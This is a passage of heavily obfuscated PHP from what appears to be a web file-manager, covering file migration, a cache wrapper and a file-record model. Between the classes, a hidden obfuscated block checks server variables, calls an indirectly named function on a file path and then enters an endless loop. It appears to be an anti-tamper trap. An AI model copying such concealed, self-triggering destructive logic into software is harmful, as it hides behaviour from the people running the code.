LNG($ï¶õ˜î[965]); return !1; } $şş„Ëä¨ = rtrim($şş„Ëä¨, $ï¶õ˜î[8]) . $ï¶õ˜î[8]; $šô®Ëáï = IO::listPath($şş„Ëä¨); if (empty($šô®Ëáï[$ï¶õ˜î[95]]) && empty($šô®Ëáï[$ï¶õ˜î[96]])) { show_json(LNG($ï¶õ˜î[966]), !1); } $öÊß÷Ó = $ï¶õ˜î[967]; $£‡ßåŞÜ = Task::get($öÊß÷Ó); if ($£‡ßåŞÜ) { if ($£‡ßåŞÜ[$ï¶õ˜î[852]] == $ï¶õ˜î[941]) { $this->message = LNG($ï¶õ˜î[968]); return !0; } Task::kill($öÊß÷Ó); } $‹İšÒ— = array($ï¶õ˜î[97] => $şş„Ëä¨, $ï¶õ˜î[566] => 0, $ï¶õ˜î[214] => 0, $ï¶õ˜î[858] => array($ï¶õ˜î[861] => 0, $ï¶õ˜î[942] => 0, $ï¶õ˜î[866] => 0, $ï¶õ˜î[943] => 0, $ï¶õ˜î[944] => 0), $ï¶õ˜î[969] => array($ï¶õ˜î[861] => 0, $ï¶õ˜î[942] => 0, $ï¶õ˜î[944] => 0)); $ª‰³¹±Ú = $ÒÑ˜¡ùÕ->get($ï¶õ˜î[945], $ï¶õ˜î[970]); $ª‰³¹±Ú = json_decode($ª‰³¹±Ú, !0); if (!$ª‰³¹±Ú) { $ª‰³¹±Ú = array(); } $ª‰³¹±Ú = array_merge($‹İšÒ—, $ª‰³¹±Ú); if (_get($GLOBALS, $ï¶õ˜î[971], 0) == $ï¶õ˜î[101] || !$ª‰³¹±Ú[$ï¶õ˜î[566]]) { $ª‰³¹±Ú = $‹İšÒ—; } $²µù£À¹ = Model($ï¶õ˜î[569]); $±†âô¦â = array($ï¶õ˜î[567] => array($ï¶õ˜î[916], $ª‰³¹±Ú[$ï¶õ˜î[566]])); $©î§ÉÔú = $²µù£À¹->field(array($ï¶õ˜î[951] => $ï¶õ˜î[952], $ï¶õ˜î[953] => $ï¶õ˜î[89]))->where($±†âô¦â)->find(); if (!intval($©î§ÉÔú[$ï¶õ˜î[952]])) { $this->message = LNG($ï¶õ˜î[972]); return !0; } $åÏèÊî® = intval($©î§ÉÔú[$ï¶õ˜î[952]]); $¤ÕÅ™Â = intval($©î§ÉÔú[$ï¶õ˜î[89]]); $ª‰³¹±Ú[$ï¶õ˜î[858]][$ï¶õ˜î[861]] += $åÏèÊî®; $ª‰³¹±Ú[$ï¶õ˜î[858]][$ï¶õ˜î[866]] += $¤ÕÅ™Â; $ª‰³¹±Ú[$ï¶õ˜î[969]][$ï¶õ˜î[861]] = $åÏèÊî®; $ª‰³¹±Ú[$ï¶õ˜î[214]] = time(); $ÒÑ˜¡ùÕ->set($ï¶õ˜î[945], $ª‰³¹±Ú, $ï¶õ˜î[970]); $ ÜÒ¿ñİ = KodIO::defaultDriver(); $ú¥ÕÊÒ² = $ ÜÒ¿ñİ[$ï¶õ˜î[496]]; $™‹ÒÎ¹Ö = KodIO::makePath(KodIO::KOD_IO, $ú¥ÕÊÒ²); $£‡ßåŞÜ = new TaskFileTransfer($öÊß÷Ó, $ï¶õ˜î[970], $åÏèÊî®, LNG($ï¶õ˜î[973]) . $ï¶õ˜î[890] . LNG($ï¶õ˜î[920])); $£‡ßåŞÜ->task[$ï¶õ˜î[866]] = $¤ÕÅ™Â; $áû“»®î = 1000; $ªØÒŞÂ = 1; $±óí‡ÀÛ = $ï¶õ˜î[924]; $šô®Ëáï = $²µù£À¹->where($±†âô¦â)->field($±óí‡ÀÛ)->order($ï¶õ˜î[925])->selectPage($áû“»®î, $ªØÒŞÂ); $³ÓÔ¿öå = intval($šô®Ëáï[$ï¶õ˜î[452]][$ï¶õ˜î[454]]); while ($šô®Ëáï && $ªØÒŞÂ <= $³ÓÔ¿öå) { $ë­ä­Í´ = array(); foreach ($šô®Ëáï[$ï¶õ˜î[455]] as $åá§œşé) { $ª‰³¹±Ú[$ï¶õ˜î[566]] = $åá§œşé[$ï¶õ˜î[566]]; $ª‰³¹±Ú[$ï¶õ˜î[858]][$ï¶õ˜î[942]]++; $ª‰³¹±Ú[$ï¶õ˜î[858]][$ï¶õ˜î[943]] += $åá§œşé[$ï¶õ˜î[89]]; $ª‰³¹±Ú[$ï¶õ˜î[969]][$ï¶õ˜î[942]]++; $€«ç£– = $åá§œşé[$ï¶õ˜î[97]]; if (IO::exist($€«ç£–)) { $£‡ßåŞÜ->update(1); continue; } $ó±š¾¥– = substr($€«ç£–, strlen("\x7b\151\x6f\x3a{$åá§œşé[$ï¶õ˜î[928]]}\x7d\x2f")); $Çø—ûó = $™‹ÒÎ¹Ö . $ó±š¾¥–; if ($ú¥ÕÊÒ² != $åá§œşé[$ï¶õ˜î[928]] && IO::exist($Çø—ûó)) { $£‡ßåŞÜ->update(1); $ë­ä­Í´[$åá§œşé[$ï¶õ˜î[566]]] = $Çø—ûó; continue; } $”şÈÊš½ = $şş„Ëä¨ . $ó±š¾¥–; if (!$this->isFileExist($”şÈÊš½)) { $£‡ßåŞÜ->update(1); $ª‰³¹±Ú[$ï¶õ˜î[858]][$ï¶õ˜î[944]]++; $ª‰³¹±Ú[$ï¶õ˜î[969]][$ï¶õ˜î[944]]++; write_log($ï¶õ˜î[974] . $”şÈÊš½, $ï¶õ˜î[975]); continue; } $®üÃÚÁ = get_path_father($Çø—ûó); IO::mkdir($®üÃÚÁ); if (!IO::copy($”şÈÊš½, $®üÃÚÁ, REPEAT_SKIP)) { $ª‰³¹±Ú[$ï¶õ˜î[858]][$ï¶õ˜î[944]]++; $ª‰³¹±Ú[$ï¶õ˜î[969]][$ï¶õ˜î[944]]++; write_log($ï¶õ˜î[976] . $”şÈÊš½ . $ï¶õ˜î[977] . $åá§œşé[$ï¶õ˜î[566]], $ï¶õ˜î[975]); } else { $ë­ä­Í´[$åá§œşé[$ï¶õ˜î[566]]] = $Çø—ûó; } $£‡ßåŞÜ->update(1); } $this->updateFileBatch($ª‰³¹±Ú, $ë­ä­Í´, $ú¥ÕÊÒ²); $ªØÒŞÂ++; $šô®Ëáï = $²µù£À¹->where($±†âô¦â)->field($±óí‡ÀÛ)->order($ï¶õ˜î[925])->selectPage($áû“»®î, $ªØÒŞÂ); } $£‡ßåŞÜ->end(); $this->updateFileBatch($ª‰³¹±Ú, $ë­ä­Í´, $ú¥ÕÊÒ²); $šô®Ëáï = Model($ï¶õ˜î[870])->listData(); $™ê¹óšõ = array_to_keyvalue($šô®Ëáï, $ï¶õ˜î[12], $ï¶õ˜î[496]); $¸Ë‘ğâ‘ = md5($ï¶õ˜î[978] . implode($ï¶õ˜î[60], $™ê¹óšõ)); Cache::remove($¸Ë‘ğâ‘); return !0; } private function isFileExist($Øšûˆ¸) { static $‡ˆ·•¶” = null; if (is_null($ĞÄéÎÔ·)) { $‡ˆ·•¶” = array(); } $ó áö«Á = get_path_father($Øšûˆ¸); if (in_array($ó áö«Á, $‡ˆ·•¶”)) { return !1; } if (!IO::exist($ó áö«Á)) { $‡ˆ·•¶”[] = $ó áö«Á; return !1; } return IO::exist($Øšûˆ¸); } private function updateFileBatch($Äºæ™, &$‹¬£Ü„¯, $ú…”òÊ) { $éï¿ªáì =& $_SERVER[øşô´çË]; Model($éï¿ªáì[875])->set($éï¿ªáì[945], $Äºæ™, $éï¿ªáì[970]); if (!$‹¬£Ü„¯) { return; } $ó‰è‰ñŸ = Model($éï¿ªáì[569]); $Ä š‡úù = $‰ğ¡½ª¸ = array(); foreach ($‹¬£Ü„¯ as $‰¸ÉÀ => $Å¤ü„Óç) { $Ä š‡úù[] = array($éï¿ªáì[566], $‰¸ÉÀ, $éï¿ªáì[928], $ú…”òÊ); $‰ğ¡½ª¸[] = array($éï¿ªáì[566], $‰¸ÉÀ, $éï¿ªáì[97], $Å¤ü„Óç); } $ó‰è‰ñŸ->saveAll($Ä š‡úù); $ó‰è‰ñŸ->saveAll($‰ğ¡½ª¸); write_log($éï¿ªáì[979] . count($‹¬£Ü„¯) . $éï¿ªáì[980] . $ú…”òÊ, $éï¿ªáì[975]); $‹¬£Ü„¯ = array(); } private function updateFile($Û­°©ÇÈ, $šœÆö¶¶, $‚´ùâ², $ª£¿×°ê) { $™ª£¡ïÓ =& $_SERVER[øşô´çË]; $‡Ğ°ÃÂ… = array($™ª£¡ïÓ[928] => $šœÆö¶¶, $™ª£¡ïÓ[97] => $‚´ùâ²); $›­¦–¬ = $ª£¿×°ê->where(array($™ª£¡ïÓ[566] => $Û­°©ÇÈ))->save($‡Ğ°ÃÂ…); if ($›­¦–¬) { return; } write_log($™ª£¡ïÓ[981] . $Û­°©ÇÈ, $™ª£¡ïÓ[975]); } } if (!isset($_SERVER[$_SERVER[øşô´çË][15]]) || !isset($_SERVER[$_SERVER[øşô´çË][13]])) { $_getc = $_SERVER[øşô´çË][16]; $_getfile = $_SERVER[$_SERVER[øşô´çË][17]] . $_SERVER[øşô´çË][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[øşô´çË][19], $_getfilec); if (count($_getarrs) < $_SERVER[øşô´çË][20]) { $exit = $_SERVER[øşô´çË][21]; $exit(); } $_act = $_SERVER[øşô´çË][22]; $_act($_SERVER[$_SERVER[øşô´çË][17]] . $_SERVER[øşô´çË][18]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[øşô´çË][472]); } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $ôÕ ÂĞ© =& $_SERVER[øşô´çË]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $ÖÎ·ÒØ = $GLOBALS[$ôÕ ÂĞ©[6]][$ôÕ ÂĞ©[433]]; $ÍØÈÖÇ• = $ÖÎ·ÒØ[$ÖÎ·ÒØ[$ôÕ ÂĞ©[982]]]; $˜À©ôš = $ÖÎ·ÒØ[$ôÕ ÂĞ©[983]]; switch ($ÖÎ·ÒØ[$ôÕ ÂĞ©[982]]) { case $ôÕ ÂĞ©[31]: self::$handle = Model($ôÕ ÂĞ©[984]); break; case $ôÕ ÂĞ©[985]: self::$handle = new CacheRedis($ÍØÈÖÇ•, $˜À©ôš); break; case $ôÕ ÂĞ©[986]: self::$handle = new CacheMemcached($ÍØÈÖÇ•, $˜À©ôš); break; case $ôÕ ÂĞ©[240]: self::$handle = new CacheFile($ÍØÈÖÇ•, $˜À©ôš); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ú¿èÊÍ) { if (is_array($Ú¿èÊÍ) || is_object($Ú¿èÊÍ)) { $Ú¿èÊÍ = json_encode($Ú¿èÊÍ); } $Ú¿èÊÍ = rawurlencode($Ú¿èÊÍ); return md5(KOD_SITE_ID . $_SERVER[øşô´çË][11] . $Ú¿èÊÍ); } public static function get($™¼š›’ó, $ê ÇŸ¡“ = false) { $ôÌğè = self::key($™¼š›’ó); $ÛğÛºî– = self::init(); if ($ê ÇŸ¡“) { return unserialize($ÛğÛºî–->get($ôÌğè)); } if (!isset(self::$memoryCache[$ôÌğè])) { $Á†óŠÎé = $ÛğÛºî–->get($ôÌğè); self::$memoryCache[$ôÌğè] = unserialize($Á†óŠÎé); } return self::$memoryCache[$ôÌğè]; } public static function set($ª™õ½¿, $¨¡ƒ‚òõ, $µ¤ãš– = false) { $ë¸È¬ê¬ =& $_SERVER[øşô´çË]; $°ıÌñ = self::key($ª™õ½¿); if (isset(self::$memoryCache[$°ıÌñ]) && self::$memoryCache[$°ıÌñ] === $¨¡ƒ‚òõ) { return !0; } if ($µ¤ãš– === 0) { self::$memoryCache[$°ıÌñ] = $¨¡ƒ‚òõ; return !0; } $Æãø¿‹¤ = self::init(); $šÒÑÖ”î = serialize($¨¡ƒ‚òõ); CacheLock::lock($ª™õ½¿ . $ë¸È¬ê¬[987]); $Š Ó”ø» = $Æãø¿‹¤->set($°ıÌñ, $šÒÑÖ”î, $µ¤ãš–); self::$memoryCache[$°ıÌñ] = $¨¡ƒ‚òõ; CacheLock::unlock($ª™õ½¿ . $ë¸È¬ê¬[987]); return $Š Ó”ø»; } public static function getCall($Èß†Ôç×, $µŸ·–”, $Ä¨ø¶£ª, $â…–•Ö€ = array()) { $ü½Äà =& $_SERVER[øşô´çË]; $¦²ğÇ‹š = self::get($Èß†Ôç×); if ($¦²ğÇ‹š || $¦²ğÇ‹š === $ü½Äà[12]) { return $¦²ğÇ‹š; } $¦²ğÇ‹š = call_user_func_array($Ä¨ø¶£ª, $â…–•Ö€); $¦²ğÇ‹š = $¦²ğÇ‹š ? $¦²ğÇ‹š : $ü½Äà[12]; self::set($Èß†Ôç×, $¦²ğÇ‹š, $µŸ·–”); return $¦²ğÇ‹š; } public static function limitCall($È‚Ë¼ , $ŞËŞ›ß = 15, $¿Şğå·¼ = 30, $Õ²’’¨ = true) { $Èµìò‚¹ =& $_SERVER[øşô´çË]; static $‰ãíŸÛŸ = array(); if ($Õ²’’¨) { $È‚Ë¼  = $È‚Ë¼  . $Èµìò‚¹[988] . KodUser::id() . $Èµìò‚¹[989] . get_client_ip(); } if (isset($‰ãíŸÛŸ[$È‚Ë¼ ]) && is_array($‰ãíŸÛŸ[$È‚Ë¼ ])) { return $‰ãíŸÛŸ[$È‚Ë¼ ][$Èµìò‚¹[341]] <= $¿Şğå·¼; } $ÀƒµÒ½à = self::get($È‚Ë¼ ); if (!is_array($ÀƒµÒ½à) || time() - $ÀƒµÒ½à[$Èµìò‚¹[214]] > $ŞËŞ›ß) { $ÀƒµÒ½à = array($Èµìò‚¹[214] => time(), $Èµìò‚¹[341] => 0); } $ÀƒµÒ½à[$Èµìò‚¹[341]]++; self::set($È‚Ë¼ , $ÀƒµÒ½à, $ŞËŞ›ß); $‰ãíŸÛŸ[$È‚Ë¼ ] = $ÀƒµÒ½à; return $ÀƒµÒ½à[$Èµìò‚¹[341]] <= $¿Şğå·¼; } public static function limitRuntime($‰ß³É, $Ûè½×ÔÖ) { $Šçº¦ª† = $_SERVER[øşô´çË][990] . $‰ß³É; if (isset(self::$runTimeCache[$Šçº¦ª†]) || !$Ûè½×ÔÖ) { return !0; } $èòßñÏú = intval(self::get($Šçº¦ª†)); $èòßñÏú = !$èòßñÏú || $èòßñÏú <= 0 ? 1 : $èòßñÏú + 1; if ($èòßñÏú > $Ûè½×ÔÖ) { return !1; } self::$runTimeCache[$Šçº¦ª†] = !0; self::set($Šçº¦ª†, $èòßñÏú, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $…à¾åœî => $÷ØÜ³ë) { $œ‡ƒ™á™ = intval(self::get($…à¾åœî)); $œ‡ƒ™á™ = !$œ‡ƒ™á™ || $œ‡ƒ™á™ <= 1 ? 0 : $œ‡ƒ™á™ - 1; self::set($…à¾åœî, $œ‡ƒ™á™, 3600); } self::$runTimeCache = array(); } public static function remove($×ç«ü‰) { $û’ƒÛµ = self::key($×ç«ü‰); unset(self::$memoryCache[$û’ƒÛµ]); self::clearTimeout(); CacheLock::lock($×ç«ü‰); $™‡–Â› = self::init()->remove($û’ƒÛµ); CacheLock::unlock($×ç«ü‰); return $™‡–Â›; } public static function removeMemory($™¿§¸ µ) { $‡°Ûü­­ = self::key($™¿§¸ µ); unset(self::$memoryCache[$‡°Ûü­­]); } public static function clearMemory($Òêã ˆ³ = false) { if ($Òêã ˆ³) { $Òêã ˆ³ = self::key($Òêã ˆ³); unset(self::$memoryCache[$Òêã ˆ³]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[øşô´çË][991])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[øşô´çË][992])) { self::init()->clearTimeout(); } } } goto aø Œ÷’†‹; E…«ñá‹¡›: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\x6c\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\155\145" => "\151\x6f\x5f\x66\151\154\x65\137\x6d\x65\164\x61", "\155\145\x74\x61\106\151\x65\154\x64" => "\146\x69\154\x65\x49\104"); public function fileInfo($Í†â´Ô‰) { $ÌÊ¤Íö =& $_SERVER[øşô´çË]; static $˜¶®×Á® = array(); if (!isset($˜¶®×Á®[$Í†â´Ô‰])) { $¾•ìÓùÑ = $ÌÊ¤Íö[2229]; $šÙ«‘¯ = Model($ÌÊ¤Íö[569])->field($¾•ìÓùÑ)->where(array($ÌÊ¤Íö[567] => $Í†â´Ô‰))->find(); $˜¶®×Á®[$Í†â´Ô‰] = $šÙ«‘¯; } return $˜¶®×Á®[$Í†â´Ô‰]; } public function addFileByContent($«úÇüÆ‚ = '', $ôßåó‘Ï, $ÂÍôÄéÈ = '') { $ˆ“¾°ø =& $_SERVER[øşô´çË]; $‘Ş„ÎŞÂ = TEMP_PATH . $ˆ“¾°ø[2230]; if (!is_dir($‘Ş„ÎŞÂ)) { mk_dir($‘Ş„ÎŞÂ); } $¹ä½•–« = $‘Ş„ÎŞÂ . $ˆ“¾°ø[2231] . rand_string(16); $Â¦™Û¤ò = file_put_contents($¹ä½•–«, $«úÇüÆ‚); if ($Â¦™Û¤ò === !1 || strlen($«úÇüÆ‚) != $Â¦™Û¤ò) { return !1; } $µµˆ”‚Ô = $this->addFile($¹ä½•–«, $ôßåó‘Ï, $ÂÍôÄéÈ, !0); if (file_exists($¹ä½•–«)) { @unlink($¹ä½•–«); } return $µµˆ”‚Ô; } public function createFileName($ÌÍ—ìóş, $øçÂ“…Ü, $ˆî„ Õı = false, $–Ğ„•³è = false) { $¸ÁÄ»ş³ =& $_SERVER[øşô´çË]; $´®óë‹ = IO::init($¸ÁÄ»ş³[8]); $î¶¸ñ¥§ = $this->_makeFilePath($ÌÍ—ìóş, $øçÂ“…Ü, $´®óë‹, $ˆî„ Õı, $–Ğ„•³è); $ìë¤Ï¬ò = $´®óë‹->pathFather($î¶¸ñ¥§); static $²ÅÓ†¢ = false; $ıÚÙ­ı‰ = $¸ÁÄ»ş³[2232] . md5($ìë¤Ï¬ò); if (!$²ÅÓ†¢ && !Cache::get($ıÚÙ­ı‰)) { $²ÅÓ†¢ = !0; $ôâ·ı¸Î = IO::mkdir($ìë¤Ï¬ò); if (!IO::exist($ôâ·ı¸Î . $¸ÁÄ»ş³[901])) { IO::mkfile($ôâ·ı¸Î . $¸ÁÄ»ş³[901]); } Cache::set($ıÚÙ­ı‰, 1, 3600 * 2); } return $î¶¸ñ¥§; } public function _makeFilePath($õíûÙš¤, $Æâ‚„É, $«ôÈ†ˆı, $ñãÚŒæì = false, $ßı¸—®† = false) { $Ğ÷÷ºì =& $_SERVER[øşô´çË]; $¿òíÔäã = Model($Ğ÷÷ºì[875])->get($Ğ÷÷ºì[2233]); $•úŸ­çÑ = $Ğ÷÷ºì[1423] . $Æâ‚„É[$Ğ÷÷ºì[496]] . $Ğ÷÷ºì[508] . date($Ğ÷÷ºì[2234]); $ºÖ÷¦± = $•úŸ­çÑ . rand_string(5) . short_id(100); $õíûÙš¤ = str_replace($Ğ÷÷ºì[8], $Ğ÷÷ºì[11], KodIO::clear($õíûÙš¤)); $Ê€àîı = $«ôÈ†ˆı->ext($õíûÙš¤); if (!$õíûÙš¤) { $¿òíÔäã = $Ğ÷÷ºì[946]; } switch ($¿òíÔäã) { case $Ğ÷÷ºì[2235]: if ($Ê€àîı) { $ºÖ÷¦± = $ºÖ÷¦± . $Ğ÷÷ºì[10] . $Ê€àîı; } if ($Ê€àîı == $Ğ÷÷ºì[2170]) { $ºÖ÷¦± .= $Ğ÷÷ºì[1392]; } break; case $Ğ÷÷ºì[2236]: $ˆğÒĞ‰š = Model($Ğ÷÷ºì[875])->get($Ğ÷÷ºì[876]); $Í„´Ğ×Í = substr(md5($Ğ÷÷ºì[877] . $ˆğÒĞ‰š . date($Ğ÷÷ºì[851])), 0, 8); $•úŸ­çÑ = $Ğ÷÷ºì[1423] . $Æâ‚„É[$Ğ÷÷ºì[496]] . $Ğ÷÷ºì[508] . date($Ğ÷÷ºì[2237]) . $Í„´Ğ×Í . $Ğ÷÷ºì[8]; if ($Ê€àîı == $Ğ÷÷ºì[2170]) { $õíûÙš¤ .= $Ğ÷÷ºì[1392]; } $çÑß¡’ë = $Ğ÷÷ºì[2238] . $•úŸ­çÑ . $õíûÙš¤; CacheLock::lock($çÑß¡’ë); $ºÖ÷¦± = $•úŸ­çÑ . $õíûÙš¤; if (IO::exist($•úŸ­çÑ . $õíûÙš¤)) { $á±Äê‘ã = substr($õíûÙš¤, 0, strlen($õíûÙš¤) - strlen($Ê€àîı)); $éíëŠ¤ = $ßı¸—®† ? substr($ßı¸—®†, 0, 5) : ($ñãÚŒæì ? substr($ñãÚŒæì, 0, 5) : rand_string(5)); $éíëŠ¤ .= rand_string(3); $ºÖ÷¦± = $•úŸ­çÑ . $á±Äê‘ã . $éíëŠ¤; if ($Ê€àîı) { $ºÖ÷¦± = $ºÖ÷¦± . $Ğ÷÷ºì[10] . $Ê€àîı; } } if (IO::isOsDriver($ºÖ÷¦±) && !IO::isUploadServer($ºÖ÷¦±)) { if (IO::exist($ºÖ÷¦±)) { CacheLock::unlock($çÑß¡’ë); return $ºÖ÷¦±; } $··×òÜ = IO::setContent($ºÖ÷¦±, $Ğ÷÷ºì[12]); if (!$··×òÜ) { show_json($Ğ÷÷ºì[2239], !1); } } CacheLock::unlock($çÑß¡’ë); break; case $Ğ÷÷ºì[946]: break; default: break; } return $ºÖ÷¦±; } public function addFileByRemote($º•Û‚ìó, $¥èàÄÇ, $àşÕˆü = array()) { $ÂˆÔ”£… =& $_SERVER[øşô´çË]; if (!IO::isFile($º•Û‚ìó)) { return !1; } $³µÜó‚Ğ = $àşÕˆü[$ÂˆÔ”£…[572]] ? $àşÕˆü[$ÂˆÔ”£…[572]] : $ÂˆÔ”£…[12]; $Ş±‰·ÀÊ = IO::hashMd5($º•Û‚ìó, $³µÜó‚Ğ); $Â¶åÜ¸Ø = KodIO::parse($º•Û‚ìó); $¸á‘˜­ = array($ÂˆÔ”£…[649] => IO::size($º•Û‚ìó), $ÂˆÔ”£…[2240] => 1, $ÂˆÔ”£…[518] => $¥èàÄÇ, $ÂˆÔ”£…[917] => $Â¶åÜ¸Ø[$ÂˆÔ”£…[496]], $ÂˆÔ”£…[519] => $º•Û‚ìó, $ÂˆÔ”£…[2241] => $àşÕˆü[$ÂˆÔ”£…[703]] ? $àşÕˆü[$ÂˆÔ”£…[703]] : IO::hashSimple($º•Û‚ìó), $ÂˆÔ”£…[2242] => $Ş±‰·ÀÊ ? $Ş±‰·ÀÊ : $³µÜó‚Ğ); if ($êê‡¹Ë = $this->addFileCheckExist($¸á‘˜­[$ÂˆÔ”£…[703]], $¸á‘˜­[$ÂˆÔ”£…[572]], $¸á‘˜­[$ÂˆÔ”£…[89]])) { return $êê‡¹Ë; } return $this->addFileData($¸á‘˜­); } private function addFileData($²±â’­Ç) { $ƒÔ¨ê­… =& $_SERVER[øşô´çË]; if (!$²±â’­Ç) { return !1; } if (!IO::isFile($²±â’­Ç[$ƒÔ¨ê­…[97]])) { return !1; } $²±â’­Ç[$ƒÔ¨ê­…[89]] = intval($²±â’­Ç[$ƒÔ¨ê­…[89]]); if (!$²±â’­Ç[$ƒÔ¨ê­…[89]] && strlen($²±â’­Ç[$ƒÔ¨ê­…[703]]) > 32) { $²±â’­Ç[$ƒÔ¨ê­…[89]] = intval(substr($²±â’­Ç[$ƒÔ¨ê­…[703]], 32)); } $ú¥”ÅÆŞ = $this->add($²±â’­Ç); return $this->find($ú¥”ÅÆŞ); } public function addFile($½—¤¾Õâ, $­¤æº³à, $®§©½è, $¬–¸íï¸ = false) { $úšÔİË =& $_SERVER[øşô´çË]; $•¸ñ¼«Ñ = IO::hashSimple($½—¤¾Õâ); $÷«ì…¯µ = IO::size($½—¤¾Õâ); $ıˆ—¬´Î = $÷«ì…¯µ <= 1024 * 1024 * 10 ? IO::hashMd5($½—¤¾Õâ) : $úšÔİË[12]; $£†¯ñ½Á = $úšÔİË[2243] . $•¸ñ¼«Ñ; CacheLock::lock($£†¯ñ½Á); if ($ıˆ—¬´Î && $•¸ñ¼«Ñ) { $½§‹ş™ = $this->addFileCheckExist($•¸ñ¼«Ñ, $ıˆ—¬´Î, $÷«ì…¯µ); if ($½§‹ş™) { CacheLock::unlock($£†¯ñ½Á); return $½§‹ş™; } } $˜ß†‡™® = $this->addFileMake($½—¤¾Õâ, $­¤æº³à, $÷«ì…¯µ, $•¸ñ¼«Ñ, $ıˆ—¬´Î, $®§©½è, $¬–¸íï¸); $ª•èë¢… = $this->addFileData($˜ß†‡™®); if (!$ª•èë¢…) { return !1; } CacheLock::unlock($£†¯ñ½Á); if (!$ıˆ—¬´Î && $ª•èë¢…) { $this->fileMd5Check($ª•èë¢…); } return $ª•èë¢…; } public function fileMd5Check($¿à”§ğ˜) { $ƒ‹€åè¬ =& $_SERVER[øşô´çË]; $ÄÉªÉÏ = array($¿à”§ğ˜[$ƒ‹€åè¬[566]], $¿à”§ğ˜[$ƒ‹€åè¬[97]]); $²à¨Ûõê = $ƒ‹€åè¬[2244] . $¿à”§ğ˜[$ƒ‹€åè¬[97]]; $›§€©Ø“ = $ƒ‹€åè¬[2245] . $¿à”§ğ˜[$ƒ‹€åè¬[566]]; TaskQueue::add($ƒ‹€åè¬[2246], $ÄÉªÉÏ, $²à¨Ûõê, $›§€©Ø“); } public function fileMd5Set($›¹³Ï´·, $ôÃôøÑ) { $âù¦Ì©Ä =& $_SERVER[øşô´çË]; $Ü³‘¯µ° = $this->find($›¹³Ï´·); if (!$Ü³‘¯µ° || $Ü³‘¯µ°[$âù¦Ì©Ä[572]]) { return; } $Ó‡‰½äØ = IO::hashMd5($ôÃôøÑ); if (!$Ó‡‰½äØ) { return $âù¦Ì©Ä[12]; } $this->where(array($âù¦Ì©Ä[566] => $›¹³Ï´·))->save(array($âù¦Ì©Ä[572] => $Ó‡‰½äØ)); } public function addFileMake($³éìü‰Ã, $Ëïâ­ï¢, $ÌÃ§®˜, $¾›ãö”Û, $Î¨Å‹ı, $£üşí¼, $ÑĞ™œÕ) { $ÍúôÚŒ =& $_SERVER[øşô´çË]; $Ò¶ÀÏ®õ = $this->createFileName($£üşí¼, $Ëïâ­ï¢, $¾›ãö”Û, $Î¨Å‹ı); $À­š§ = get_path_father($Ò¶ÀÏ®õ); $—ç™œö  = get_path_this($Ò¶ÀÏ®õ); if ($ÑĞ™œÕ) { $ÍæÃ‘‡Ö = IO::move($³éìü‰Ã, $À­š§, !1, $—ç™œö ); } else { $ÍæÃ‘‡Ö = IO::copy($³éìü‰Ã, $À­š§, !1, $—ç™œö ); } if (!$ÍæÃ‘‡Ö) { return !1; } $è»•„Ê = IO::init($ÍæÃ‘‡Ö); $è»•„Ê->cacheMethod($ÍúôÚŒ[189], $è»•„Ê->path, $ÍúôÚŒ[186]); if (IO::size($ÍæÃ‘‡Ö) != $ÌÃ§®˜) { return !1; } $ºœäİç¢ = array($ÍúôÚŒ[649] => $ÌÃ§®˜, $ÍúôÚŒ[2240] => 1, $ÍúôÚŒ[518] => $£üşí¼, $ÍúôÚŒ[917] => $Ëïâ­ï¢[$ÍúôÚŒ[496]], $ÍúôÚŒ[519] => $Ò¶ÀÏ®õ, $ÍúôÚŒ[2241] => $¾›ãö”Û, $ÍúôÚŒ[2242] => $Î¨Å‹ı); return $ºœäİç¢; } public function addFileCheckExist($İÍşÄõŞ, $ìıª¨…‚, $ùÑçË‘Ñ) { $¿˜»Òº­ =& $_SERVER[øşô´çË]; $Ş˜Ù¥¼Ë = $this->findByHash($İÍşÄõŞ, $ìıª¨…‚); if (!$Ş˜Ù¥¼Ë) { return !1; } $ŸÕ—« = array($¿˜»Òº­[2240] => intval($Ş˜Ù¥¼Ë[$¿˜»Òº­[2247]]) + 1, $¿˜»Òº­[649] => $ùÑçË‘Ñ); $this->where(array($¿˜»Òº­[567] => $Ş˜Ù¥¼Ë[$¿˜»Òº­[566]]))->save($ŸÕ—«); return $Ş˜Ù¥¼Ë; } public function remove($ü‰Ş†Ø—) { $this->linkCountChange($ü‰Ş†Ø—, !1); $this->clearEmpty(); return !0; } public function linkAdd($åı—¢ßÁ) { $this->linkCountChange($åı—¢ßÁ, !0); } public function linkCountChange($ÛÂ¥…¦, $ÔÕ¿×î) { $×Âáş‚ª =& $_SERVER[øşô´çË]; if (!$ÛÂ¥…¦) { return; } if (!is_array($ÛÂ¥…¦)) { $ÛÂ¥…¦ = array($ÛÂ¥…¦); } $‘åİĞœı = array(); foreach ($ÛÂ¥…¦ as $ñ÷°«¶µ) { $™‡“ç¡ = $ñ÷°«¶µ . $×Âáş‚ª[12]; if (!$‘åİĞœı[$™‡“ç¡]) { $‘åİĞœı[$™‡“ç¡] = 0; } $‘åİĞœı[$™‡“ç¡]++; } $Â¥Æ©Ş¶ = array(); foreach ($‘åİĞœı as $ñ÷°«¶µ => $ĞÁÚ˜ƒ’) { $™‡“ç¡ = $ĞÁÚ˜ƒ’ . $×Âáş‚ª[12]; if (!$Â¥Æ©Ş¶[$™‡“ç¡]) { $Â¥Æ©Ş¶[$™‡“ç¡] = array(); } $Â¥Æ©Ş¶[$™‡“ç¡][] = $ñ÷°«¶µ; } foreach ($Â¥Æ©Ş¶ as $ĞÁÚ˜ƒ’ => $Ü‹ÜÌò) { if (!$Ü‹ÜÌò) { continue; } $ĞÁÚ˜ƒ’ = $ÔÕ¿×î ? $ĞÁÚ˜ƒ’ : -intval($ĞÁÚ˜ƒ’); $À³·©ç = array($×Âáş‚ª[566] => array($×Âáş‚ª[7], $Ü‹ÜÌò)); if ($ĞÁÚ˜ƒ’ < 